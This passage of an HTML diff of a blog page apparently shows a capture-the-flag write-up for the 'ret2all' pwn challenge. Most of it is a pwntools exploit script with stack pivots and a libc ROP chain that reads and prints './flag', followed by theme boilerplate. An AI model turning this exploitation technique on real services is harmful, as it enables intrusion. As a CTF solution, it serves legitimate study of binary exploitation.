class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,RBP+<span class="hljs-number">0xd0</span>,<br>    read_addr,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">33</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x28</span>,<br>    ret,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span><br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload6)<br>payload7 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload7)<br><br>payload8 = flat(<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xd8</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x28</span>,RBP+<span class="hljs-number">0xe8</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0x200</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<br>    RBP+<span class="hljs-number">0x28</span>,ret,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0x33</span>,<br>    read_addr3<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload8)<br><br>payload9 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br>io.recv()<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload9)<br><br>syscall = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address = syscall - <span class="hljs-number">0x98fb6</span><br>success(<span class="hljs-string">&quot;libc_address:&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address)) <br><br>pop_rax_ret = libc.address + <span class="hljs-number">0xdd237</span><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x10f75b</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x110a4d</span><br>pop_rbx_ret = libc.address + <span class="hljs-number">0x586e4</span><br><br>payload10 = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>,<br>    <span class="hljs-comment">#close(0)</span><br>    pop_rax_ret,<span class="hljs-number">3</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,syscall,<br>    <span class="hljs-comment">#open(&#x27;./flag&#x27;,0) </span><br>    pop_rax_ret,<span class="hljs-number">2</span>,<br>    pop_rdi_ret,RBP+<span class="hljs-number">0xe8</span>,<br>    pop_rsi_ret,<span class="hljs-number">0</span>,syscall,<br>    <span class="hljs-comment">#read(0,RBP,0x200)</span><br>    pop_rax_ret,<span class="hljs-number">0</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,<br>    pop_rsi_ret,RBP,syscall,<br>    <span class="hljs-comment">#write(2,RBP,0x200)</span><br>    pop_rax_ret,<span class="hljs-number">1</span>,<br>    pop_rdi_ret,<span class="hljs-number">2</span>,syscall<br>)<br><br>io.send(payload10)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#cli_script() </span><br><br>io = process(<span class="hljs-string">&#x27;./pwn_patched&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn_patched&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p =remote(&#x27;node4.anna.nssctf.cn&#x27;,28537)</span><br><span class="hljs-comment">#context.terminal = [&#x27;wt.exe&#x27;, &#x27;wsl&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = elf.arch,os = elf.os)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">i</span>):<br>    gdb.attach(i)<br>    pause()<br><br><span class="hljs-comment"># dbg(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>RBP = <span class="hljs-built_in">int</span>(io.recvline(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&quot;RBP:&quot;</span>+<span class="hljs-built_in">hex</span>(RBP))<br><br>io.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>RET = <span class="hljs-built_in">int</span>(io.recvline(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&quot;RET:&quot;</span>+<span class="hljs-built_in">hex</span>(RET))   <br><br>elf_base = RET - <span class="hljs-number">0x1871</span><br>success(<span class="hljs-string">&quot;elf_base:&quot;</span>+<span class="hljs-built_in">hex</span>(elf_base))<br><br>read_addr = elf_base + <span class="hljs-number">0x182F</span><br>read_addr2 = elf_base + <span class="hljs-number">0x1840</span><br>read_addr3 = elf_base + <span class="hljs-number">0x183B</span><br>add_rbp_3d_ebx = elf_base + <span class="hljs-number">0x1252</span><br>pop_rbp_ret = add_rbp_3d_ebx +<span class="hljs-number">1</span><br>ret = pop_rbp_ret + <span class="hljs-number">1</span><br>leave_ret = elf_base + <span class="hljs-number">0x1852</span><br><br>payload1 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP + <span class="hljs-number">0x10</span>,<br>    read_addr,<br>    RBP - <span class="hljs-number">0x10</span><br>)<br><br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload1)<br><br>payload2 = flat(<br>    p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr,<br>    leave_ret,<br>    RBP+<span class="hljs-number">0x100</span>,<br>    leave_ret,<br>    RBP-<span class="hljs-number">0x18</span>,<br>    leave_ret,<br>    <span class="hljs-number">0</span>,<br>    p8(<span class="hljs-number">0xec</span>)<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload2)<br>payload3 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload3)<br><br>payload4 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>,<br>    p64(<span class="hljs-number">0</span>),RBP+<span class="hljs-number">0x30</span>,<br>    RBP+<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6edca</span>,<br>    <span class="hljs-number">0x200</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x40</span>,<br>    read_addr2,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span>,RBP+<span class="hljs-number">0x150</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload4)<br><br>payload5 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br><br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload5)<br><br>payload6 = flat(<br>    leave_ret,add_rbp_3d_ebx,<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xa8</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,RBP+<span class="hljs-number">0xd0</span>,<br>    read_addr,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">33</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x28</span>,<br>    ret,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span><br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload6)<br>payload7 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload7)<br><br>payload8 = flat(<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xd8</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x28</span>,RBP+<span class="hljs-number">0xe8</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0x200</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<br>    RBP+<span class="hljs-number">0x28</span>,ret,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0x33</span>,<br>    read_addr3<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload8)<br><br>payload9 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br>io.recv()<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload9)<br><br>syscall = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address = syscall - <span class="hljs-number">0x98fb6</span><br>success(<span class="hljs-string">&quot;libc_address:&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address)) <br><br>pop_rax_ret = libc.address + <span class="hljs-number">0xdd237</span><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x10f75b</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x110a4d</span><br>pop_rbx_ret = libc.address + <span class="hljs-number">0x586e4</span><br><br>payload10 = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>,<br>    <span class="hljs-comment">#close(0)</span><br>    pop_rax_ret,<span class="hljs-number">3</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,syscall,<br>    <span class="hljs-comment">#open(&#x27;./flag&#x27;,0) </span><br>    pop_rax_ret,<span class="hljs-number">2</span>,<br>    pop_rdi_ret,RBP+<span class="hljs-number">0xe8</span>,<br>    pop_rsi_ret,<span class="hljs-number">0</span>,syscall,<br>    <span class="hljs-comment">#read(0,RBP,0x200)</span><br>    pop_rax_ret,<span class="hljs-number">0</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,<br>    pop_rsi_ret,RBP,syscall,<br>    <span class="hljs-comment">#write(2,RBP,0x200)</span><br>    pop_rax_ret,<span class="hljs-number">1</span>,<br>    pop_rdi_ret,<span class="hljs-number">2</span>,syscall<br>)<br><br>io.send(payload10)<br>io.interactive()<br></code></pre></td></tr></table></figure></div>
 
-<p>参考：<a target="_blank" rel="noopener" href="https://lil-house.feishu.cn/wiki/JqIEw4fTPiHcRnkSazacGBTNng6">‌​‌‬​​﻿﻿‬​﻿‌‌​​﻿​‬⁠​​‍​‍​‬​​​​‬​​​​​​​​​‌​​‬​‍‬​‬⁠ret2all - 飞书云文档</a><br>        <a target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/151363747">LilCTF pwn ret2all-CSDN博客</a></p>
+<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://lil-house.feishu.cn/wiki/JqIEw4fTPiHcRnkSazacGBTNng6" >‌​‌‬​​﻿﻿‬​﻿‌‌​​﻿​‬⁠​​‍​‍​‬​​​​‬​​​​​​​​​‌​​‬​‍‬​‬⁠ret2all - 飞书云文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>        <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/151363747" >LilCTF pwn ret2all-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> ret2all详细分析与总结</li>
+        <li><strong>Author:</strong> The Redefine Team</li>
+        <li><strong>Created at
+                :</strong> 2025-11-03 14:29:56</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-11-03 14:31:26
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/11/03/ret2all详细分析与总结/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/ret2all/">#ret2all</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="../../../10/16/iot%E5%85%A5%E9%97%A8-mips%E5%9F%BA%E7%A1%80/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">iot入门--mips基础</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '../../../../js/libs/waline.js';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">ret2all详细分析与总结</div>
+		
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">The Redefine Team</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        5 posts in total
+                    </span>
+                    
+                </p>
+            
         </div>
         
-        <!-- 文章导航 - 只在同分类有多篇文章时显示 -->
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
         
         
         
-        
-        <!-- 推荐文章 -->
-        
-
-
-<div class="vs-recommended-posts">
-  <div class="vs-recommended-header">
-    <div class="section-header">
-      <i class="fas fa-lightbulb"></i>
-      <span>RELATED POSTS</span>
-    </div>
-  </div>
-  
-  <div class="vs-recommended-grid">
-    
-      <div class="vs-recommended-item" data-index="0" tabindex="0">
-        <a href="../../../10/16/iot%E5%85%A5%E9%97%A8-mips%E5%9F%BA%E7%A1%80/" class="vs-recommended-link">
-          <!-- 文章信息 -->
-          <div class="vs-recommended-content">
-            <div class="vs-recommended-title">
-              <i class="fas fa-file-code"></i>
-              <span>iot入门--mips基础</span>
-            </div>
-            
-            <div class="vs-recommended-excerpt">
-              编译MIPS环境 1sudo apt-get install gcc-mips-linux-gnu 运行和调试qemu 环境搭建qemu两种模式 qemu-user和qemu-user-static 12sudo apt-get updat...
-            </div>
-            
-            <div class="vs-recommended-meta">
-              
-              
-              
-                <span class="vs-tags-preview">
-                  <i class="fas fa-tags"></i>
-                  mips
-                  
-                </span>
-              
-              
-              <span class="vs-meta-info">
-                <span class="vs-date">
-                  <i class="fas fa-calendar-alt"></i>
-                  Oct 16
-                </span>
-                <span class="vs-reading-time">
-                  <i class="fas fa-clock"></i>
-                  2 min
-                </span>
-              </span>
-            </div>
-          </div>
-        </a>
-      </div>
-    
-      <div class="vs-recommended-item" data-index="1" tabindex="0">
-        <a href="../../../08/05/%E9%AB%98%E7%89%88%E6%9C%AClargebin-attack/" class="vs-recommended-link">
-          <!-- 文章信息 -->
-          <div class="vs-recommended-content">
-            <div class="vs-recommended-title">
-              <i class="fas fa-file-code"></i>
-              <span>高版本largebin_attack</span>
-            </div>
-            
-            <div class="vs-recommended-excerpt">
-              利用源码123456789101112131415161718192021 /* maintain large bins in sorted order */ if (fwd != bck) # 检查large bin是否为空 &amp;#123;...
-            </div>
-            
-            <div class="vs-recommended-meta">
-              
-              
-              
-                <span class="vs-tags-preview">
-                  <i class="fas fa-tags"></i>
-                  heap
-                  
-                </span>
-              
-              
-              <span class="vs-meta-info">
-                <span class="vs-date">
-                  <i class="fas fa-calendar-alt"></i>
-                  Aug 05
-                </span>
-                <span class="vs-reading-time">
-                  <i class="fas fa-clock"></i>
-                  1 min
-                </span>
-              </span>
-            </div>
-          </div>
-        </a>
-      </div>
-    
-      <div class="vs-recommended-item" data-index="2" tabindex="0">
-        <a href="../../../05/12/ret2dl/" class="vs-recommended-link">
-          <!-- 文章信息 -->
-          <div class="vs-recommended-content">
-            <div class="vs-recommended-title">
-              <i class="fas fa-file-code"></i>
-              <span>ret2dl</span>
-            </div>
-            
-            <div class="vs-recommended-excerpt">
-              延迟绑定运作流程 dl_runtime_resolve运作流程理解_dl_runtime_resolve的流程需要了解几个段 1、dynamic段.dynamic段中保存了动态链接器需要的信息，Dynamic Symbol Table（动态...
-            </div>
-            
-            <div class="vs-recommended-meta">
-              
-              
-              
-                <span class="vs-tags-preview">
-                  <i class="fas fa-tags"></i>
-                  stack
-                  
-                </span>
-              
-              
-              <span class="vs-meta-info">
-                <span class="vs-date">
-                  <i class="fas fa-calendar-alt"></i>
-                  May 12
-                </span>
-                <span class="vs-reading-time">
-                  <i class="fas fa-clock"></i>
-                  7 min
-                </span>
-              </span>
-            </div>
-          </div>
-        </a>
-      </div>
-    
-      <div class="vs-recommended-item" data-index="3" tabindex="0">
-        <a href="../../../04/29/%E5%89%8D%E8%A8%80/" class="vs-recommended-link">
-          <!-- 文章信息 -->
-          <div class="vs-recommended-content">
-            <div class="vs-recommended-title">
-              <i class="fas fa-file-code"></i>
-              <span>前言</span>
-            </div>
-            
-            <div class="vs-recommended-excerpt">
-              ​ 重新折腾了一下blog，之前也折腾过一个，但是一段时间就没有管了。写blog主要是想记录自己的生活和学习总结。也是对自己的一个督促。希望有一天自己能够成为独当一面的存在
-            </div>
-            
-            <div class="vs-recommended-meta">
-              
-              
-              
-              
-              <span class="vs-meta-info">
-                <span class="vs-date">
-                  <i class="fas fa-calendar-alt"></i>
-                  Apr 29
-                </span>
-                <span class="vs-reading-time">
-                  <i class="fas fa-clock"></i>
-                  1 min
-                </span>
-              </span>
-            </div>
-          </div>
-        </a>
-      </div>
-    
-  </div>
-  
-  <!-- 查看更多 -->
-  <div class="vs-recommended-footer">
-    <a href="../../../../archives/" class="vs-view-more">
-      <i class="fas fa-folder-open"></i>
-      <span>View More Posts</span>
-      <i class="fas fa-chevron-right"></i>
-    </a>
-  </div>
-</div>
-
-<script>
-// 键盘导航支持
-document.addEventListener('DOMContentLoaded', function() {
-  const items = document.querySelectorAll('.vs-recommended-item');
-  let currentIndex = -1;
-  
-  // 键盘事件
-  document.addEventListener('keydown', function(e) {
-    if (!items.length) return;
-    
-    if (e.key === 'Tab') {
-      // Tab键导航由浏览器处理
-      return;
-    }
-    
-    if (e.key === 'ArrowRight' || e.key === 'ArrowLeft') {
-      e.preventDefault();
-      
-      // 移除当前高亮
-      if (currentIndex >= 0) {
-        items[currentIndex].classList.remove('vs-focused');
-      }
-      
-      // 更新索引
-      if (e.key === 'ArrowRight') {
-        currentIndex = (currentIndex + 1) % items.length;
-      } else {
-        currentIndex = currentIndex <= 0 ? items.length - 1 : currentIndex - 1;
-      }
-      
-      // 添加新高亮
-      items[currentIndex].classList.add('vs-focused');
-      items[currentIndex].focus();
-    }
-    
-    if (e.key === 'Enter' && currentIndex >= 0) {
-      const link = items[currentIndex].querySelector('a');
-      if (link) link.click();
-    }
-  });
-  
-  // 鼠标悬停时更新当前索引
-  items.forEach((item, index) => {
-    item.addEventListener('mouseenter', function() {
-      currentIndex = index;
-      items.forEach(i => i.classList.remove('vs-focused'));
-      item.classList.add('vs-focused');
-    });
-  });
-});
-</script>
-
-        
-        <!-- 评论区 -->
-        
-  <div class="vs-comments-section">
-    <div class="section-header">
-      <i class="fas fa-comments"></i>
-      <span>COMMENTS</span>
-    </div>
-    
-    
-      <!-- Waline 评论系统 -->
-      <div id="waline"></div>
-      <script>
-        // 加载 Waline CSS
-        const walineCSS = document.createElement('link');
-        walineCSS.rel = 'stylesheet';
-        walineCSS.href = 'https://unpkg.com/@waline/client@v3/dist/waline.css';
-        document.head.appendChild(walineCSS);
-        
-        // 加载 Waline JS
-        const walineScript = document.createElement('script');
-        walineScript.type = 'module';
-        walineScript.onload = function() {
-          // 确保 Waline 加载后再初始化
-          import('https://unpkg.com/@waline/client@v3/dist/waline.js').then(({ init }) => {
-            const waline = init({
-              el: '#waline',
-              serverURL: 'vsc4tblackcat1337.vercel.app',
-              lang: 'zh-CN',
-              locale: {},
-              emoji: ["https://unpkg.com/@waline/emojis@1.2.0/weibo","https://unpkg.com/@waline/emojis@1.2.0/alus"],
-              requiredMeta: [],
-              login: 'disable',
-              wordLimit: 0,
-              pageSize: 10,
-              imageUploader: false,
-              highlighter: true,
-              texRenderer: false,
-              search: false,
-              pageview: false,
-              comment: true,
-              copyright: false,
-              
-              // 自动适配主题
-              dark: document.documentElement.getAttribute('data-theme') === 'dark' ? 'auto' : false,
-              
-              // 评论框占位符
-              placeholder: 'Feel free to leave a comment, no login required!',
-              
-              // 元数据配置
-              meta: ['nick', 'mail', 'link'],
-              
-              // 表情配置
-              emojiCDN: 'https://unpkg.com/@waline/emojis@1.2.0/',
-            });
-            
-            // 监听主题变化
-            const observer = new MutationObserver((mutations) => {
-              mutations.forEach((mutation) => {
